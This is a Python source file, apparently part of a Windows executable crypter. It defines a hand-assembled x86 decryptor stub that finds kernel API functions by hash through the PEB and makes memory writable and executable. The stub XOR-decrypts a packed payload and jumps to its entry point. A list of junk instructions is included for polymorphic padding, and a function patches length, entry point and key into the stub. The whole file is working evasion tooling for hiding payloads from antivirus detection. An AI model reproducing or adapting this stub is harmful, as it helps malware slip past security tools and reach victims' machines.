DECRYPTER = [
    [ 0xe8, 0x00, 0x00, 0x00, 0x00 ],           # call dword 0x5
    [ 0x5a ],                                   # pop edx
    [ 0x83, 0xEA, 0x06 ],                       # sub edx,byte +0x6
    [ 0x52 ],                                   # push edx
    [ 0x64, 0x8B, 0x1D, 0x30, 0x00, 0x00, 0x00 ], # mov ebx,[dword fs:0x30]
    [ 0x8B, 0x5B, 0x0C ],                       # mov ebx,[ebx+0xc]
    [ 0x8B, 0x5B, 0x0C ],                       # mov ebx,[ebx+0xc]
    [ 0x8B, 0x1B ],                             # mov ebx,[ebx]
    [ 0x8B, 0x1B ],                             # mov ebx,[ebx]
    [ 0x8B, 0x43, 0x18 ],                       # mov eax,[ebx+0x18]
    [ 0x89, 0x45, 0xFC ],                       # mov [ebp-0x4],eax
    [ 0x8B, 0x40, 0x3C ],                       # mov eax,[eax+0x3c]        21
    [ 0x03, 0x45, 0xFC ],                       # add eax,[ebp-0x4]
    [ 0x8B, 0x40, 0x78 ],                       # mov eax,[eax+0x78]
    [ 0x03, 0x45, 0xFC ],                       # add eax,[ebp-0x4]
    [ 0x8B, 0x58, 0x20 ],                       # mov ebx,[eax+0x20]
    [ 0x03, 0x5D, 0xFC ],                       # add ebx,[ebp-0x4]
    [ 0x8B, 0x48, 0x1C ],                       # mov ecx,[eax+0x1c]
    [ 0x03, 0x4D, 0xFC ],                       # add ecx,[ebp-0x4]
    [ 0x8B, 0x50, 0x24 ],                       # mov edx,[eax+0x24]
    [ 0x03, 0x55, 0xFC ],                       # add edx,[ebp-0x4]
    [ 0x51 ],                                   # push ecx
    
    [ 0x8B, 0x33 ],                             # GetFunctionLoop: mov esi,[ebx]
    [ 0x03, 0x75, 0xFC ],                       # add esi,[ebp-0x4]
    [ 0x52 ],                                   # push edx
    [ 0x56 ],                                   # push esi
    [ 0xE8, 0x4F, 0x00, 0x00, 0x00 ],           # call dword Hash
    [ 0x5A ],                                   # pop edx
    [ 0x3D, 0x3C, 0xD1, 0x38, 0x00, 0x0f, 0x84, 0x88, 0x88, 0x88, 0x88 ], # cmp eax,0x38d13c  |  jz GetFunctionOut
    [ 0x83, 0xC3, 0x04 ],                       # add ebx,byte +0x4
    [ 0x83, 0xC2, 0x02 ],                       # add edx,byte +0x2
    [ 0xE9, 0xE4, 0xff, 0xff, 0xff ],           # jmp GetFunctionLoop
    
    [ 0x59 ],                                   # GetFunctionOut: pop ecx
    [ 0x31, 0xDB ],                             # xor ebx,ebx
    [ 0x66, 0x8B, 0x1A ],                       # mov bx,[edx]
    [ 0x6B, 0xDB, 0x04 ],                       # imul ebx,ebx,byte +0x4
    [ 0x8B, 0x04, 0x19 ],                       # mov eax,[ecx+ebx]
    [ 0x03, 0x45, 0xFC ],                       # add eax,[ebp-0x4]
    [ 0x5A ],                                   # pop edx
    [ 0x89, 0xD1 ],                             # mov ecx,edx
    [ 0x81, 0xE9, 0x11, 0x11, 0x11, 0x11 ],     # sub ecx,0x11111111
    [ 0x51 ],                                   # push ecx
    [ 0x52 ],                                   # push edx
    [ 0x83, 0xec, 0x04 ],                       # sub esp, 4
    [ 0x54 ],                                   # push esp
    [ 0x6A, 0x40 ],                             # push byte +0x40
    [ 0x68, 0x11, 0x11, 0x11, 0x11 ],           # push dword 0x11111111
    [ 0x51 ],                                   # push ecx
    [ 0xFF, 0xD0 ],                             # call eax
    
    [ 0x83, 0xC4, 0x04 ],                       # add esp, 4
    [ 0x5a ],                                   # pop edx
    [ 0x59 ],                                   # pop ecx
    
    [ 0x89, 0xC8 ],                             # mov eax,ecx
    [ 0x05, 0x22, 0x22, 0x22, 0x22 ],           # add eax,0x22222222
    [ 0x81, 0x31, 0x33, 0x33, 0x33, 0x33 ],     # loop: xor dword [ecx],0x33333333
    [ 0x39, 0xd1, 0x0f, 0x8d, 0x05, 0x00, 0x00, 0x00 ],  # cmp ecx, edx  |  jge out
    [ 0x83, 0xC1, 0x04 ],                       # add ecx,byte +0x4
    [ 0xe9, 0xe7, 0xff, 0xff, 0xff ],           # jmp loop
    [ 0xFF, 0xE0 ],                             # out: jmp eax
    
    [ 0x55 ],                                   # Hash: push ebp
    [ 0x89, 0xE5 ],                             # mov ebp,esp
    [ 0x8B, 0x4D, 0x08 ],                       # mov ecx,[ebp+0x8]
    [ 0x31, 0xC0 ],                             # xor eax,eax
    [ 0x31, 0xD2 ],                             # xor edx,edx
    [ 0x80, 0x39, 0x00, 0x0F, 0x84, 0xb8, 0x00, 0x00, 0x00 ], # HashLoop: cmp byte [ecx],0x0  |  jz HashOut
    [ 0x8A, 0x11 ],                             # mov dl,[ecx]
    [ 0x80, 0xCA, 0x60 ],                       # or dl,0x60
    [ 0x01, 0xD0 ],                             # add eax,edx
    [ 0xD1, 0xE0 ],                             # shl eax,1
    [ 0x83, 0xC1, 0x01 ],                       # add ecx,byte +0x1
    [ 0xE9, 0xED, 0x00, 0x00, 0x00 ],           # jmp HashLoop
    [ 0x89, 0xEC ],                             # HashOut: mov esp,ebp
    [ 0x5D ],                                   # pop ebp
    [ 0xC2, 0x04, 0x00 ]                        # ret 0x4
]

JMP_OFFSETS = [
    [ 0x48, 99 ],           # call Hash
    [ 0x54, 11 ],           # je GetFunctionOut
    [ 0x5f, -35 ],          # jmp GetFunctionLoop    
    [ 0xa1, 8 ],            # jge out
    [ 0xa9, -22 ],          # jmp loop
    [ 0xbe, 17 ],           # jz HashOut
    [ 0xcf, -26 ]           # jmp HashLoop
]

CRUFT = [
    [ 0x90 ],               # nop
    [ 0x21, 0xc0 ],         # and eax, eax
    [ 0x21, 0xdb ],         # and ebx,ebx
    [ 0x21, 0xc9 ],         # and ecx,ecx
    [ 0x21, 0xd2 ],         # and edx,edx 
    [ 0x87, 0xdb ],         # xchg ebx,ebx
    [ 0x87, 0xc9 ],         # xchg ecx,ecx
    [ 0x87, 0xd2 ],         # xchg edx,edx 
    [ 0x09, 0xc0 ],         # or eax,eax
    [ 0x09, 0xdb ],         # or ebx,ebx
    [ 0x09, 0xc9 ],         # or ecx,ecx
    [ 0x09, 0xd2 ],         # or edx,edx 
    [ 0x83, 0xe0, 0xff ],   # and eax, 0xffffffff
    [ 0x83, 0xe3, 0xff ],   # and ebx, 0xffffffff
    [ 0x83, 0xe1, 0xff ],   # and ecx, 0xffffffff
    [ 0x83, 0xe2, 0xff ],   # and edx, 0xffffffff 
]

encode_int32 = lambda x: [(0xff & (x >> (8 * i))) for i in range(4)]

def get_shellcode(length, entry, key):
    decrypter = DECRYPTER
    
    # replace length, entry point and key values
    decrypter[40] = decrypter[40][:2] + encode_int32(length - 1) + decrypter[40][2 + 4:]
    decrypter[46] = decrypter[46][:1] + encode_int32(length - 1) + decrypter[46][1 + 4:]
    decrypter[53] = decrypter[53][:1] + encode_int32(entry) + decrypter[53][1 + 4:]
    decrypter[54] = decrypter[54][:2] + encode_int32(key) + decrypter[54][2 + 4:]

    return decrypter
